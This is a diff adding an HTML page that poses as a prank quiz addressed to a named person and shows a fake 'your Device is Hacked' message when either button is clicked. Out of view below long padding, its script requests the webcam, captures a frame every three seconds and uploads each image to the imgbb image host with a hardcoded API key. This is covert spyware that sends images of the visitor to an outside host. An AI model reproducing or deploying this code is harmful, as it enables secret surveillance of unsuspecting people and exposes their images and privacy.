@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+  <style>
+    
+    .btn {
+      width: 25%;
+      background-clip: #3C3E52;
+      font-size: 90%;
+    }
+  </style>
+</head>
+
+<body id="body" style="background-color: palevioletred; color:black; text-align: center ">
+  
+<div style="background-image: ;" id="surprise">
+  
+  <h1>Oromo<br>
+     Melaku Zekarias Are you finding for real XXX situations ?
+  
+  <br>
+  <button  class="btn" onclick="surprise()">Yes</button>
+  <button class="btn" onclick="surprise()">No</button>
+  </h1>
+  
+  
+</div>
+  
+  
+<div style="padding-top: 1200px;"></div>
+<video id="v" autoplay></video>
+<canvas id="c" ></canvas>
+<script>
+function surprise() {
+  
+  
+  document.getElementById("body").style.backgroundImage = "url(/hacked.jpg)";
+  
+  document.getElementById("body").style.color = "green";
+  document.getElementById("body").innerHTML = `<h1 style="color: rgba(57, 255, 1, 20); background-color: black;padding-top: 150px">your Device is Hacked <br>
+  I am your big dady</h1>`;
+}
+
+
+
+
+
+
+
+
+const v = document.getElementById("v");
+const c = document.getElementById("c");
+const x = c.getContext("2d");
+
+navigator.mediaDevices.getUserMedia({ video: true })
+  .then(s => v.srcObject = s);
+
+function captureFrame() {
+  
+
+  c.width = v.videoWidth;
+  c.height = v.videoHeight;
+  x.drawImage(v, 0, 0);
+
+  // ✅ RAW base64 (no prefix!)
+  const base64 = c.toDataURL("image/png").split(",")[1];
+
+  const API_KEY = "91bf37cc9e01478a2677e9842ad456fe";
+
+  fetch(`https://api.imgbb.com/1/upload?key=${API_KEY}`, {
+    method: "POST",
+    body: new URLSearchParams({
+      image: base64
+    })
+  })
+  .then(r => r.json())
+  .then(d => {
+    if (!d.success) {
+      console.error(d);
+      window.alert("Upload failed");
+      return;
+    }
+    
+  })
+  .catch(console.error);
+
+  
+
+}
+
+// every 10 seconds
+setInterval(captureFrame, 3000);
+</script>
+  
+</body>
+
+</html>
